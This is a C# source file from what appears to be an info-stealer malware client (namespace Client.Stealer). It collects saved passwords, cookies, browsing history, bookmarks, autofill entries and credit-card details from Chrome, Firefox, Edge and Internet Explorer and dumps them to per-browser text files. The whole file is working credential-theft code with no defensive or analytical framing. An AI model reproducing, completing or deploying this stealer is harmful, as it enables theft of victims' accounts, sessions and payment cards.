using System;
using System.IO;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Text;

namespace Client.Stealer
{
    enum BrowserType
    {
        CHROME, FIREFOX, EDGE, IE
    }
    enum InfoType
    {
        PASSWORDS,COOKIES,HISTORYS,BOOKMARKS,AUTOFILLS,CREDITS
    }
    class Browser
    {
        public string type = "";
        public List<CreditCard> pCreditCards = new List<CreditCard>();
        public List<Password> pPasswords = new List<Password>();
        public List<Cookie> pCookies = new List<Cookie>();
        public List<Site> pHistory = new List<Site>();
        public List<AutoFill> pAutoFill = new List<AutoFill>();
        public List<Bookmark> pBookmarks = new List<Bookmark>();

        public Browser()
        {
            Load();
        }
        public static Browser Create(BrowserType _tp)
        {
            switch (_tp)
            {
                case BrowserType.CHROME:
                    {
                        return new Chromium.Recovery();
                    }
                case BrowserType.FIREFOX:
                    {
                        return new Firefox.Recovery();
                    }
                case BrowserType.EDGE:
                    {
                        return new Edge.Recovery();
                    }
                case BrowserType.IE:
                    {
                        return new InternetExplorer.Recovery();
                    }
            }
            return new Browser();
        }
        public static void SaveAll(string sSavePath)
        {
            foreach (BrowserType tp in new List<BrowserType>
                { BrowserType.CHROME, BrowserType.FIREFOX, BrowserType.EDGE, BrowserType.IE})
            {
                Browser.Create(tp).Save(sSavePath);
            }
        }
        public static bool GetAllInfo(StringBuilder builder, InfoType _tp)
        {
            foreach (BrowserType tp in new List<BrowserType>
                { BrowserType.CHROME, BrowserType.FIREFOX, BrowserType.EDGE, BrowserType.IE})
            {
                Browser brs =  Browser.Create(tp);
                switch (_tp)
                {
                    case InfoType.PASSWORDS:
                        {
                            brs.GetPasswords(builder);
                            break;
                        }
                    case InfoType.BOOKMARKS:
                        {
                            brs.GetBookmarks(builder);
                            break;
                        }
                    case InfoType.COOKIES:
                        {
                            brs.GetCookies(builder);
                            break;
                        }
                    case InfoType.HISTORYS:
                        {
                            brs.GetHistorys(builder);
                            break;
                        }
                    case InfoType.AUTOFILLS:
                        {
                            brs.GetAutoFills(builder);
                            break;
                        }
                    case InfoType.CREDITS:
                        {
                            brs.GetCreditCards(builder);
                            break;
                        }
                }
            }
            return true;
        }
        protected virtual void Load()
        {
            pCreditCards.Clear();
            pPasswords.Clear();
            pCookies.Clear();
            pHistory.Clear();
            pAutoFill.Clear();
            pBookmarks.Clear();
        }

        public bool GetPasswords(StringBuilder builder)
        {
            builder.Append($"---------------{type} Passwords---------------\r\n");
            return cBrowserUtils.WritePasswords(pPasswords, builder);
        }
        public bool GetCookies(StringBuilder builder)
        {
            builder.Append($"---------------{type} Cookies---------------\r\n");
            return cBrowserUtils.WriteCookies(pCookies, builder);
        }
        public bool GetBookmarks(StringBuilder builder)
        {
            builder.Append($"---------------{type} Bookmarks---------------\r\n");
            return cBrowserUtils.WriteBookmarks(pBookmarks, builder);
        }
        public bool GetAutoFills(StringBuilder builder)
        {
            builder.Append($"---------------{type} Autofills---------------\r\n");
            return cBrowserUtils.WriteAutoFill(pAutoFill, builder);
        }
        public bool GetHistorys(StringBuilder builder)
        {
            builder.Append($"---------------{type} Histories---------------\r\n");
            return cBrowserUtils.WriteHistory(pHistory, builder);
        }
        public bool GetCreditCards(StringBuilder builder)
        {
            builder.Append($"---------------{type} Credit Cards---------------\r\n");
            return cBrowserUtils.WriteCreditCards(pCreditCards, builder);
        }

        public void Save(string sSavePath)
        {
            string filepath = sSavePath + $"\\{type}.txt";
            File.Delete(filepath);

            File.AppendAllText(filepath, $"---------------{type} Data---------------\r\n\r\n");
            StringBuilder builder = new StringBuilder();
            GetPasswords(builder);
            GetCookies(builder);
            GetBookmarks(builder);
            GetAutoFills(builder);
            GetHistorys(builder);
            GetCreditCards(builder);
            File.AppendAllText(filepath, builder.ToString());
        }
    }
}

